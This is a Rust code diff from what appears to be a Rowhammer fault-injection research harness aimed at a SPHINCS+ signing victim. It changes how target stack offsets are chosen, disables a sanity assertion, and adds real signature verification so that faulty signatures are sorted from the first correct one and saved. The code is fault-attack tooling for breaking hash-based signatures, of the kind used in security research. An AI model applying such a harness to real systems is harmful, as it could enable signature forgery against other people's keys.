@@ -1,15 +1,15 @@
 use super::{HammerVictim, HammerVictimError, InjectionConfig, PageInjector, VictimResult};
 use crate::{
+    crypto_sign_open,
     memory::{find_flippy_page, BitFlip, FlipDirection, PfnResolver, PhysAddr},
     util::{
         cancelable_thread::{spawn_cancelable, CancelableJoinHandle},
-        PAGE_MASK, PAGE_SIZE,
+        Anyhow, PAGE_MASK, PAGE_SIZE,
     },
 };
-use anyhow::Context;
+use anyhow::{ensure, Context};
 use libc::sched_getcpu;
 use serde::Serialize;
-use sha2::{Digest, Sha256};
 use std::fs::OpenOptions;
 use std::io;
 use std::io::Write;
@@ -212,12 +212,15 @@ impl SphincsPlus {
         let (target, env) = if binary.eq("victims/stack-dummy/stack") {
             (TARGET_OFFSET_DUMMY.clone(), "".into())
         } else {
+            /*
             let mut target = if flip.flip_direction() == FlipDirection::ZeroToOne {
                 TARGET_OFFSETS_SHAKE_256S[9].clone()
             } else {
-                TARGET_OFFSETS_SHAKE_256S[5].clone()
+                TARGET_OFFSETS_SHAKE_256S[7].clone()
             };
-            assert_eq!(flip.flip_direction(), target.flip_direction); // sanity check for our target selection, I'm becoming quite paranoid of
+            */
+            let mut target = TARGET_OFFSETS_SHAKE_256S[7].clone();
+            //assert_eq!(flip.flip_direction(), target.flip_direction); // sanity check for our target selection, I'm becoming quite paranoid of
             let (env, page_overflow) = make_env_for(flip.addr, target.page_offset);
             if page_overflow {
                 target.stack_offset -= 1;
@@ -465,32 +468,23 @@ fn process_victim_signatures(
         .append(true)
         .open("sigs.txt")
         .expect("Failed to open sigs.txt");
+    let pk = std::fs::read_to_string("keys.txt").expect("Failed to read keys.txt");
+    let pk = pk
+        .lines()
+        .find(|line| line.starts_with("pk:"))
+        .expect("Public key not found in keys.txt")
+        .trim_start_matches("pk:")
+        .trim();
+    let pk = hex::decode(pk).expect("Failed to decode public key");
+    let mut found_correct = false;
     loop {
         if !running.load(Ordering::Relaxed) {
             return;
         }
         debug!("Waiting for victim to send signature");
         let signature = stdout.read_line();
-        match signature {
-            Ok(signature) => {
-                let expected_sha256 = [
-                    "a2dc0903dbbf54dfaeec7475438864b8fa0b22f6fe9d0aa3d91faf5b323abde5", // sphincs+ sig
-                    "dd4e6730520932767ec0a9e33fe19c4ce24399d6eba4ff62f13013c9ed30ef87", // dummy 4096 bytes of 0xaa (python3 -c "print('aa' * 4096, end='')" | shasum -a 256)
-                    "12d0401ec5e681b3da36c7654381c418e671fb288fe320893f0efeb021df2582", // dummy 4096 bytes of 0x55 (python3 -c "print('55' * 2048, end='')" | shasum -a 256)
-                    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", // empty string
-                ];
-                let mut hasher = Sha256::new();
-                hasher.update(signature.as_bytes());
-                let result = hasher.finalize();
-                let sig_sha256 = hex::encode(result);
-                let flipped = !expected_sha256.contains(&sig_sha256.as_str());
-                if flipped {
-                    info!("Writting flippy signature {} to file...", sig_sha256);
-                    // Write the signature to "sigs.txt"
-                    writeln!(file, "{}", signature).expect("Failed to write to sigs.txt");
-                    signatures.lock().unwrap().push(signature);
-                }
-            }
+        let signature = match signature {
+            Ok(signature) => signature,
             Err(e) => match e.kind() {
                 std::io::ErrorKind::UnexpectedEof => {
                     return;
@@ -504,7 +498,31 @@ fn process_victim_signatures(
                     continue;
                 }
             },
+        };
+        let sig = hex::decode(signature.clone()).expect("Failed to decode signature");
+        let msg = sphincsp_open(sig, pk.clone());
+        let faulty = msg.is_err();
+        if faulty {
+            info!("Writing faulty signature to file...");
+            // Write the signature to "sigs.txt"
+            writeln!(file, "[FAULTY] {}", signature).expect("Failed to write to sigs.txt");
+            signatures.lock().unwrap().push(signature);
+        } else if !found_correct {
+            found_correct = true;
+            info!("Found first correct signature, writing to file...");
+            writeln!(file, "[CORRECT] {}", signature).expect("Failed to write to sigs.txt");
         }
+    }
+}
+
+fn sphincsp_open(sig: Vec<u8>, pk: Vec<u8>) -> anyhow::Result<String> {
+    unsafe {
+        let smlen = sig.len() as u64;
+        let mut m = sig.clone();
+        let mut mlen = smlen;
+        let ret = crypto_sign_open(m.as_mut_ptr(), &mut mlen, sig.as_ptr(), smlen, pk.as_ptr());
+        ensure!(ret == 0, "crypto_sign_open failed with error code {}", ret);
+        String::from_utf8((&m[..mlen as usize]).into()).anyhow()
     }
 }
 
@@ -543,7 +561,7 @@ impl SphincsPlus {
     }
 }
 
-trait ReadLine {
+pub trait ReadLine {
     fn read_line(&mut self) -> std::io::Result<String>;
 }
 
